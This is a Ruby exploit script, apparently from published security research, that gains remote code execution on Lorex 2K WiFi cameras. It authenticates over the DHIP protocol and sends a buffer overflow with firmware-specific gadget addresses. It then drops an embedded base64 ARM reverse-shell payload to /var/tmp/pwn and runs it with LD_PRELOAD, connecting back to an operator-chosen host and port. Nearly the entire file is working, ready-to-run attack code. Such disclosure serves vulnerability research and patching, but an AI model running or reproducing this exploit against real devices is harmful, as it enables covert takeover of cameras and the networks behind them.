# frozen_string_literal: true

# Authenticated RCE exploit, targeting the Lorex 2K WiFi Camera. Chain with LOREX_AUTHBYPASS.rb for unauthenticated RCE!
#
# Author: Stephen Fewer, Rapid7. Sept 6, 2024.

require 'optparse'
require 'socket'
require 'digest'
require 'json'
require 'base64'
require 'pp'

class LOREX_RCE
  def initialize(options)
    @options = options
    @step = nil
    @tcp_sock = nil
    @tcp_id = 0
    @tcp_session_id = 0
    # This is payload.s as assembled by NASM and base64 encoded. It is an ARM32 shared object binary
    # containing a reverse shell payload, that can bypass the DSH restriction in Lorex busybox.
    @payload_bin = Base64.decode64('f0VMRgEBAQAAAAAAAAAAAAMAKAABAAAA/AAAADQAAAB0AAAAAAAAADQAIAACACwAAgABAAEAAAAAAAAAAAAAAAAAAADvvq3e776t3gcAAAAAEAAAAgAAAAcAAADIAAAAyAAAAMgAAAAwAAAAMAAAAAAQAAABAAAABgAAAAAAAADIAAAAyAAAADAAAAAAAAAAAAAAAAAAAAAIAAAABwAAAAAAAAADAAAAAAAAAPgAAAD4AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAMAAAA/AAAAAUAAAD4AAAABgAAAPgAAAAKAAAAAAAAAAsAAAAAAAAAAAAAAAAAAAAAAAAAAgCg4wEQoOMFIIHijHCg441wh+IAAADvAGCg4WAQj+IQIKDjjXCg445wh+IAAADvBgCg4QAQoOM/cKDjAAAA7wYAoOEBEKDjP3Cg4wAAAO8GAKDhAhCg4z9woOMAAADvJACP4gRAJOAQAC3pDSCg4SRAj+IQAC3pDRCg4QtwoOMAAADvAgARXMCoViMvYmluL3NoAAAAAAAAAAAAL2Jpbi9zaAAAAAAAAAAAAAAAAAAA')
  end

  def log(txt)
    $stdout.puts("[#{Time.now.strftime('%-d/%b/%Y %H:%M:%S')}] [+]#{@step.nil? ? '' : " Step #{@step}:"} #{txt}")
  end

  def log_error(txt)
    $stdout.puts("[#{Time.now.strftime('%-d/%b/%Y %H:%M:%S')}] [-]#{@step.nil? ? '' : " Step #{@step}:"} #{txt}")
  end

  def get_vopt(opt)
    @options[:versions][@options[:version]][opt]
  end

  def dhip_udp_send(command, id: 0, session_id: 0, recv_response: true)
    s = UDPSocket.new

    data = [
      0x20,
      0x50494844, # 'DHIP' magic value
      session_id,
      id,
      command.length,
      0,
      command.length,
      0
    ].pack('V*') << command

    s.send(data, 0, @options[:ip], @options[:dhip_port])

    return nil unless recv_response

    response, = s.recvfrom(8192)

    if response.nil? || (response.length <= 32)
      log_error 'Bad response'
      return nil
    end

    JSON.parse(response[32..response.length - 2])
  rescue JSON::ParserError
    log_error 'JSON parsing error'
    nil
  end

  def dhip_tcp_send(command, recv_response: true)
    if @tcp_sock.nil?
      log_error 'No socket connection'
      return nil
    end

    data = [
      0x20,
      0x50494844, # 'DHIP' magic value
      @tcp_session_id,
      @tcp_id,
      command.length,
      0,
      command.length,
      0
    ].pack('V*') << command

    @tcp_sock.write(data)

    @tcp_id += 1

    return nil unless recv_response

    response, = @tcp_sock.recv(1024 * 1024)

    if response.nil? || (response.length <= 32)
      log_error 'Bad response'
      return nil
    end

    JSON.parse(response[32..response.length])
  rescue JSON::ParserError
    log_error 'JSON parsing error'
    nil
  end

  def dhip_get_version
    command = {
      'method' => 'DHDiscover.search',
      'params' => {}
    }.to_json

    json = dhip_udp_send(command)

    return false if json.nil?

    @options[:version] = json.dig('params', 'deviceInfo', 'Version')
    @options[:serialno] = json.dig('params', 'deviceInfo', 'SerialNo')
    @options[:mac] = json['mac']

    !(@options[:version].nil? || @options[:serialno].nil? || @options[:mac].nil?)
  end

  def dhip_tcp_login
    command = {
      'method' => 'this can be anything',
      'params' => {
        'userName' => @options[:username],
        #  'password' => '',
        'clientType' => 'Web3.0' # ->Web3.0 Local
        # 'loginType' => 'Direct', # -->Direct Console Loopback
        # 'authorityType' => 'Default',
        # 'passwordType' => 'Plain', # -->Default Plain
        # 'ipAddr' => '127.0.0.1',
      },
      'id' => @tcp_id,
      'session' => @tcp_session_id
    }

    response1 = dhip_tcp_send(command.to_json)

    unless response1['params']['encryption'] == 'Default'
      log_error 'Unknown login encryption scheme (Expected Default)'
      pp response1
      return false
    end

    hash1 = Digest::MD5.hexdigest(@options[:username] + ':' + response1['params']['realm'] + ':' + @options[:password]).upcase

    hash2 = Digest::MD5.hexdigest(@options[:username] + ':' + response1['params']['random'] + ':' + hash1).upcase

    command['params']['password'] = hash2

    @tcp_session_id = response1['session']

    command['session'] = @tcp_session_id

    response2 = dhip_tcp_send(command.to_json)

    # @tcp_id = response2['id']

    if response2['result'] != true
      log_error 'Login result was false'
      pp response2
      return false
    end

    true
  end

  def dhip_tcp_trigger_overflow
    buffer  = String.new

    buffer << 'A' * 128
    buffer << 'BBBB' # r4
    buffer << 'BBBB' # r5
    buffer << 'BBBB' # r6
    buffer << 'BBBB' # r7
    buffer << 'BBBB' # r8
    buffer << [0x5B000000 | get_vopt(:fork_and_execl_gadget) | 1].pack('V') # pc, can only have 1 null, no ASLR, must be ASCII (or valid encoded json)
    buffer << 'DDDD' # [sp]
    buffer << ' ' * (16 - 4)

    cmd = String.new

    cmd << "#   AAA1BBB1CCC1DDD1EEE1FFF1GGG1HHH1III1JJJ1KKK1LLL1MMM1NNN1OOO1PPP1QQQ1RRR1SSS1TTT1UUU1VVV1WWW1XXX1YYY1ZZZ1Z\n\n\n\n"
    cmd << '#   AAA2BBB2CCC2DDD2EEE2FFF2GGG2HHH2III2JJJ2KKK2LLL2MMM2NNN2OOO' + 'DEAD' + "\n\n\n\n"

    reverse_shell_payload = @payload_bin.dup

    throw 'payload.bin expects 1 LPORT value' if reverse_shell_payload.scan([4444].pack('n')).length != 1

    throw 'payload.bin expects 1 LHOST value' if reverse_shell_payload.scan(Socket.sockaddr_in(0, '192.168.86.35')[4,4]).length != 1

    reverse_shell_payload.gsub!([0xDEADBEEF].pack('V'), [reverse_shell_payload.length].pack('V'))

    reverse_shell_payload.gsub!(Socket.sockaddr_in(0, '192.168.86.35')[4, 4], Socket.sockaddr_in(0, @options[:lhost])[4, 4])

    reverse_shell_payload.gsub!([4444].pack('n'), [@options[:lport]].pack('n'))

    blob = String.new

    reverse_shell_payload.each_byte do |b|
      blob << format('\\\\x%02x', b)
    end

    cmd << "echo #{blob} >/var/tmp/pwn;"

    cmd << 'LD_PRELOAD=/var/tmp/pwn /usr/bin/qr'

    # NOTE: We can write to /mnt/sd but /var/tmp/ is a better choice (in case no SD card is inserted).

    throw '[-] cmd cant end with semi-colon' if cmd.end_with? ';'

    buffer << "#{cmd};while :;do :;done;#"

    buffer << 'PPP.XXX'

    throw '[-] must only have 1 dot charachter' if buffer.count('.') != 1

    throw '[-] must only have 1 open square bracket charachter' if buffer.count('[') != 1

    command = {
      'method' => 'configManager.getConfig',
      'params' => {
        'channel' => 1,
        'table' => %w[a a a a],
        'name' => buffer
      },
      'id' => @tcp_id,
      'session' => @tcp_session_id
    }

    json_command = command.to_json

    json_command.gsub!('DEAD', [get_vopt(:null_deref_gadget)].pack('V'))

    dhip_tcp_send(json_command, recv_response: false)

    # sleep so we dont close the connection before the server side has processed the command.
    sleep(10)

    true
  end

  def main
    log 'Starting...'

    log "Targeting: #{@options[:ip]}"

    #
    # Step 0: Target version detection (and check).
    #
    @step = 0

    unless dhip_get_version
      log_error 'Failed to get version information'
      return false
    end

    log "Detected Version: #{@options[:version]}"
    log "Detected SerialNo: #{@options[:serialno]}"
    log "Detected MAC: #{@options[:mac]}"

    unless @options[:versions].key? @options[:version]
      log_error 'We dont have suport for this version'
      return false
    end

    #
    # Step 1: Authenticate.
    #
    @step = 1

    @tcp_sock = TCPSocket.new(@options[:ip], @options[:http_port])

    log 'Authenticating...'

    unless dhip_tcp_login
      log_error 'Login failed'
      return false
    end

    #
    # Step 2: Trigger the overflow.
    #
    @step = 2

    log 'Triggering...'

    dhip_tcp_trigger_overflow

    true
  ensure
    @step = nil

    log 'Finished.'
  end
end

options = {
  lhost: nil,
  lport: nil,
  ip: nil,
  username: 'admin',
  password: 'Hacking3!',
  http_port: 80,
  dhip_port: 37_810,
  versions: {
    '2.800.030000000.3.R' => {
      fork_and_execl_gadget: 0x002C0A2C,
      null_deref_gadget: 0xffff0ff0
    },
    '2.800.020000000.3.R' => {
      fork_and_execl_gadget: 0x002C0A2C,
      null_deref_gadget: 0xffff0ff0
    }    
  },
  version: nil,
  serialno: nil,
  mac: nil
}

OptionParser.new do |opts|
  opts.banner = "Usage: #{$PROGRAM_NAME} [options]"

  opts.on('--lhost LHOST', 'LHOST IP to catch the reverse shell') do |v|
    options[:lhost] = v
  end

  opts.on('--lport LPORT', 'LPORT port number to catch the reverse shell') do |v|
    options[:lport] = v.to_i
  end

  opts.on('-t', '--target TARGET', 'Target IP') do |v|
    options[:ip] = v
  end

  opts.on('-p', '--password PASSWORD', 'Set admin password') do |v|
    options[:password] = v
  end
end.parse!

if options[:lhost].nil?
  warn('[-] Error, you must pass a LHOST IP: --lhost LHOST')
  return
end

if options[:lport].nil?
  warn('[-] Error, you must pass a LPORT: --lport LPORT')
  return
end

if options[:ip].nil?
  warn('[-] Error, you must pass a target IP: -t TARGET')
  return
end

LOREX_RCE.new(options).main
